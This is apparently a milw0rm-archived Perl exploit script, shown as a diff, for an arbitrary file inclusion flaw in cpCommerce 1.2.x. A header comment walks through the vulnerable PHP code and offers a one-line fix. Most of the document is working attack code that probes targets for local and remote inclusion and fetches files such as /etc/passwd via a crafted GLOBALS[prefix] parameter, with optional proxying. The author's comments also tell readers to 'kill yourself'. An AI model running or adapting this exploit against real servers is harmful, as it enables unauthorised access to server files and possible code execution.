@@ -1,0 +1,220 @@
+#!/usr/bin/perl
+# 
+# cpCommerce 1.2.x GLOBALS[prefix] Arbitrary File Inclusion Exploit
+# 
+# by staker
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# mail: staker[at]hotmail[dot]it
+# url: http://cpcommerce.cpradio.org
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#  
+# it works with register_globals=on
+# if you wanna carry out a LFI -> mq=off 
+#
+# short explanation:
+#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# cpCommerce contains one flaw that allows an
+# attacker to include a remote or local file
+# because of require_once() in _functions.php
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# File _functions.php
+# 
+#  [begin block code] 
+#  ------------------
+#
+#  define("CPCOMMERCE_LOADED", true);
+#  ini_set("register_globals",0);     <------ {1} totally useless
+#  error_reporting(E_ALL ^ E_NOTICE);
+#
+#  // Older PHP Versions
+#  if (phpversion() < "4.0.6" && isset($HTTP_POST_VARS))
+#    $_POST = ($HTTP_POST_VARS);
+#  if (phpversion() < "4.0.6" && isset($HTTP_GET_VARS))
+#    $_GET = ($HTTP_GET_VARS);
+#  if (phpversion() < "4.0.6" && isset($HTTP_COOKIE_VARS))
+#    $_COOKIE = ($HTTP_COOKIE_VARS);
+#  if (phpversion() < "4.0.6" && isset($HTTP_SERVER_VARS))
+#    $_SERVER = ($HTTP_SERVER_VARS);
+#  if (phpversion() < "4.0.6" && isset($HTTP_POST_FILES))
+#    $_FILES = ($HTTP_POST_FILES);
+#  if (phpversion() < "4.0.6" && isset($HTTP_SESSION_VARS))
+#    $_SESSION = ($HTTP_SESSION_VARS);
+#  
+# // Start MySQL and Sessions
+# session_start();
+#
+#  // Resolve PHP running under fcgi
+#  if (empty($_SERVER['PHP_SELF']))
+#    $_SERVER['PHP_SELF'] = $_SERVER['SCRIPT_NAME'];
+#
+#  ## Protect prefix vulnerability
+#  if (strpos($_SERVER['PHP_SELF'],"_functions.php") !== false)
+#                   header("Location: {$_SERVER['HTTP_HOST']}"); <------ {2} exit or die function?
+#  if (!isset($prefix) || isset($_REQUEST['prefix'])) $prefix = ""; <--- {3} this is interesting
+#
+# ## Include Configuration Files
+# require_once("{$prefix}_config.php"); <-------- {4} include $prefix variable + _config.php
+# 
+# ----------------
+# [end block code] 
+#
+# Explanation (code snippet above [points]) 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# 1. actually ini_set() doesn't work..so doesn't change anything
+# 2. header() needs an exit or die function otherwise is useless
+# 2. because of header() without die we bypass the direct access
+# 3. all REQUEST variables are not allowed,what about GLOBALS[]?
+# 4. require_once() include $prefix variable.
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+# It's not possible to include a remote/local file using a web
+# browser because you will be automatically redirected in another
+# page ($_SERVER['HTTP_HOST']). What about scripts or curl? yeah
+#
+# http://[target]/[path]/_functions.php?GLOBALS[prefix]=[FILE]
+# 
+# Various:
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# They didn't help me but i wanna give a thanks to girex,str0ke
+# Gianluka_95,p3ri0d,mrdoktom,Aquilo & http://zeroidentity.org
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Don't contact me on messenger,i'm bored of stupid questions!
+# so if you wanna help about exploit usage. kill yourself ok?
+# I didn't contact anyone to fix this bug, at least not yet,
+# but i release a possible fix here:
+#
+# _functions.php line: 36 Replace it with the following code: 
+# 
+# die(header("Location: http://{$_SERVER['HTTP_HOST']}")); 
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+# Today is: 23 May 2009. 
+# Location: Italy,Turin.
+# http://www.youtube.com/watch?v=TmFi2snLr7o
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+use LWP::UserAgent;
+
+
+print "[*--------------------------------------------------------------*]\n".
+      "[* cpCommerce 1.2.x GLOBALS[prefix] Arbitrary Inclusion Exploit *]\n".
+      "[*--------------------------------------------------------------*]\n". 
+      "[* Usage: ./cpCommerce.pl [target]/[path] [filename] [proxy]    *]\n".
+      "[* [filename] such as /etc/passwd or http://milw0rm.com         *]\n".
+      "[* [proxy] is optional ex: 151.21.42.10:8080                    *]\n".
+      "[*--------------------------------------------------------------*]\n";
+
+
+die "Example: localhost/cpcommerce /etc/passwd\n" unless @ARGV; 
+        
+my $host = $ARGV[0];
+my $type = $ARGV[1];
+
+my $expl = new cpCommerce;
+
+print $expl->vulnerable($host);
+print $expl->local_file($host,$type);
+ 
+
+
+package cpCommerce;
+
+sub new
+{   
+        my $class = shift;
+        my $self = {};
+     
+        $self->{vulnerable} = undef;
+        $self->{parse_url}  = undef;
+        $self->{local_file} = undef;
+        
+        bless($self,$class);
+        
+        return $self;
+}
+
+
+
+sub vulnerable
+{           
+        my ($class,$host) = @_; 
+        
+        my $www = new LWP::UserAgent(
+                                      max_redirect => 0,
+                                      agent        => 'ELinks/0.9.3 (textmode; Linux 2.6.11 i686; 79x24)',
+                                    ) || die $!;
+        
+        if ($ARGV[2] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}?$/) {
+               $www->proxy(['http', 'ftp'], $class->parse_url($ARGV[2]));
+        } 
+                                      
+        $host = $class->parse_url($host);
+             
+        my $exter = $www->get($host.'/_functions.php?GLOBALS[prefix]=http://');    
+        my $local = $www->get($host.'/_functions.php?GLOBALS[prefix]=%00');
+        my @check = ();
+        
+        push(@check,'LFI') unless $local->content =~ /0_config.php'/i;
+        push(@check,'RFI') unless $exter->content =~ /URL file-access is disabled/i;
+             
+        if (scalar(@check) == 0) {
+              return "Site not vulnerable because of php.ini settings.\n";
+        }
+        else {
+              return "Vulnerable to: ${check[0]} ${check[1]}\n";
+        }                
+}       
+
+
+sub local_file
+{
+       my ($class,$host,$file) = @_;
+       
+       my $www = new LWP::UserAgent(
+                                     max_redirect => 0,
+                                     agent        => 'Lynxy/6.6.6dev.8 libwww-FM/3.14159FM',
+                                   ) || die $!;  
+       
+       if ($ARGV[2] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}?$/) {
+               $www->proxy(['http', 'ftp'], $class->parse_url($ARGV[2]));
+       }  
+       
+       $host = $class->parse_url($host);
+       
+       my $request = $www->get($host.'/_functions.php?GLOBALS[prefix]='.$file.'%00');
+       my $result;
+       
+       if ($request->status_line =~ /^302|200|301/ || $request->is_success) 
+       {
+              if ($request->content =~ /Failed opening/i) {
+                    return "Exploit failed.\n";
+              }
+              else {
+                    my @result = split /No database selected/,$request->content;
+                    return $result[0];
+              }       
+       }
+       else 
+       {
+              if ($request->as_string !~ /(ecommerce|oscommerce)/i) {
+                    return "cpCommerce not found\n";
+              }
+              else {
+                    $request->as_string;
+              }      
+       }           
+}
+               
+
+sub parse_url
+{
+        my ($class,$string) = @_;
+        
+        if ($string !~ /^http:\/\/?/i) {
+                $string = 'http://'.$string;
+        }
+        
+        return $string;
+}                 
+
+# milw0rm.com [2009-05-26]
